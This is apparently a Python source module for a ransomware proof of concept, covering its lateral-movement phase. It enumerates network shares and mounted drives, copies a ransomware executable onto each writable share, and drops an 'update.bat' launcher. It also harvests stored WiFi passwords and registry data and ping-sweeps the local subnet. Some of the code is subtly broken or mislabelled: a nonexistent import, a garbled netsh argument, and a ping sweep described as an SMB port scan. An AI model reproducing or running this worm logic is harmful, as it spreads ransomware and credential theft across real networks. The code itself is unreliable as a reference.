# Lateral movement module for ransomware PoC
# Phase 3: network share enumeration, SMB spread, credential harvesting
import os
import platform
import subprocess
import smbconnection
import logging
from ransomware.logging import logger

logger = logging.getLogger("ransomware.spread")


def _run_cmd(cmd: str) -> tuple[str, str]:
    """Run a shell command, return (stdout, stderr)."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout.strip(), result.stderr.strip()
    except Exception as e:
        return "", str(e)


def enumerate_network_shares() -> list[str]:
    """
    Enumerate all accessible network shares on the LAN using net view.
    Returns a list of UNC paths (e.g. ['\\\\192.168.1.10\\share', ...]).
    """
    if platform.system() != "Windows":
        return []

    shares = []
    stdout, _ = _run_cmd('net view')
    for line in stdout.splitlines():
        if "\\\\" in line:
            parts = line.split()
            if parts:
                share_name = parts[0].strip()
                if not share_name.endswith("$"):  # Skip admin shares
                    shares.append(share_name)
    logger.info(f"Found {len(shares)} network shares")
    return shares


def enumerate_unc_paths() -> list[str]:
    """
    Find all mounted network drives and their UNC equivalents.
    Returns list of UNC paths.
    """
    if platform.system() != "Windows":
        return []

    unc_paths = []
    stdout, _ = _run_cmd('net use')
    for line in stdout.splitlines():
        if "\\\\" in line:
            parts = line.split()
            if len(parts) >= 1:
                unc = parts[1].strip() if len(parts) >= 2 else parts[0].strip()
                if "Microsoft Windows Network" not in unc:
                    unc_paths.append(unc)
    logger.info(f"Found {len(unc_paths)} mounted UNC paths")
    return unc_paths


def _copy_to_share(share_path: str, exe_path: str) -> bool:
    """
    Copy the ransomware executable to a writable network share.
    share_path: e.g. '\\\\192.168.1.10\\public'
    exe_path: path to the ransomware executable
    """
    if not os.path.exists(exe_path):
        logger.error(f"_copy_to_share: exe not found at {exe_path}")
        return False

    dest = os.path.join(share_path, os.path.basename(exe_path))
    try:
        import shutil
        shutil.copy2(exe_path, dest)
        logger.info(f"Copied ransomware to network share: {dest}")
        return True
    except PermissionError:
        logger.warning(f"_copy_to_share: permission denied on {share_path}")
        return False
    except Exception as e:
        logger.error(f"_copy_to_share: failed to copy to {share_path}: {e}")
        return False


def spread_to_share(share_path: str, exe_path: str, auto_execute: bool = False) -> bool:
    """
    Copy ransomware executable to a network share and optionally
    create a launcher script for lateral spread.
    """
    copied = _copy_to_share(share_path, exe_path)
    if not copied:
        return False

    if auto_execute:
        # Create a batch launcher on the share
        batch_path = os.path.join(share_path, "update.bat")
        try:
            with open(batch_path, "w") as f:
                f.write(f"@echo off\nstart \"\" \"{exe_path}\"\n")
            logger.info(f"Created launcher batch on share: {batch_path}")
        except Exception as e:
            logger.error(f"spread_to_share: failed to write batch: {e}")
    return True


def spread_to_network(exe_path: str) -> int:
    """
    Attempt to spread the ransomware to all accessible network shares.
    Returns the number of shares successfully spread to.
    """
    if platform.system() != "Windows":
        logger.warning("spread_to_network: only supported on Windows")
        return 0

    if not os.path.exists(exe_path):
        logger.error(f"spread_to_network: exe not found at {exe_path}")
        return 0

    unc_paths = enumerate_unc_paths()
    shares = enumerate_network_shares()
    all_targets = list(set(unc_paths + shares))

    spread_count = 0
    for target in all_targets:
        try:
            if spread_to_share(target, exe_path, auto_execute=True):
                spread_count += 1
        except Exception as e:
            logger.error(f"spread_to_network: failed to spread to {target}: {e}")
    logger.info(f"Spread complete: {spread_count}/{len(all_targets)} shares")
    return spread_count


def harvest_credentials_from_registry() -> dict:
    """
    Attempt to read saved credentials from the Windows Registry.
    Focuses on commonly-used stored credential paths.
    Returns a dict of credential info (NOT plaintext passwords in real scenarios).
    """
    if platform.system() != "Windows":
        return {}

    creds = {}
    reg_paths = [
        (r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", "recent commands"),
        (r"HKCU\Software\TrueCrypt", "TrueCrypt"),
        (r"HKCU\Software\DiskNumber", "Disk encryption"),
    ]
    for reg_path, label in reg_paths:
        try:
            stdout, _ = _run_cmd(f'reg query "{reg_path}"')
            if "ERROR" not in stdout:
                creds[label] = stdout
                logger.info(f"Harvested registry data from {reg_path}")
        except Exception:
            pass
    return creds


def harvest_wifi_passwords() -> list[str]:
    """
    Extract stored WiFi passwords using netsh.
    Returns list of SSID:password strings.
    """
    if platform.system() != "Windows":
        return []

    passwords = []
    stdout, _ = _run_cmd('netsh wlan show profiles mode=敏感')
    for line in stdout.splitlines():
        if "All User Profile" in line or "所有用户配置文件" in line:
            ssid = line.split(":")[-1].strip()
            pass_stdout, _ = _run_cmd(f'netsh wlan show profile name="{ssid}" key=clear')
            for pline in pass_stdout.splitlines():
                if "Key Content" in pline or "关键内容" in pline:
                    pwd = pline.split(":")[-1].strip()
                    passwords.append(f"{ssid}:{pwd}")
    if passwords:
        logger.info(f"Harvested {len(passwords)} WiFi passwords")
    return passwords


def enumerate_smb_ports() -> list[tuple[str, int]]:
    """
    Scan local subnet for machines with open SMB ports (445, 139).
    Returns list of (IP, port) tuples.
    """
    if platform.system() != "Windows":
        return []

    open_hosts = []
    # Get local subnet
    stdout, _ = _run_cmd('ipconfig | findstr /i "ipv4 subnet"')
    for line in stdout.splitlines():
        if "IPv4" in line:
            parts = line.split(":")
            if len(parts) >= 2:
                ip = parts[1].strip().split(",")[0].strip()
                if ip != "127.0.0.1":
                    # Try to scan common SMB target: entire /24 subnet
                    subnet = ".".join(ip.split(".")[:3])
                    for host in range(1, 255, 5):
                        target = f"{subnet}.{host}"
                        try:
                            result = subprocess.run(
                                f'ping -n 1 -w 200 {target}',
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=1,
                            )
                            if result.returncode == 0:
                                open_hosts.append((target, 445))
                        except Exception:
                            pass
    logger.info(f"Found {len(open_hosts)} hosts with SMB port open")
    return open_hosts
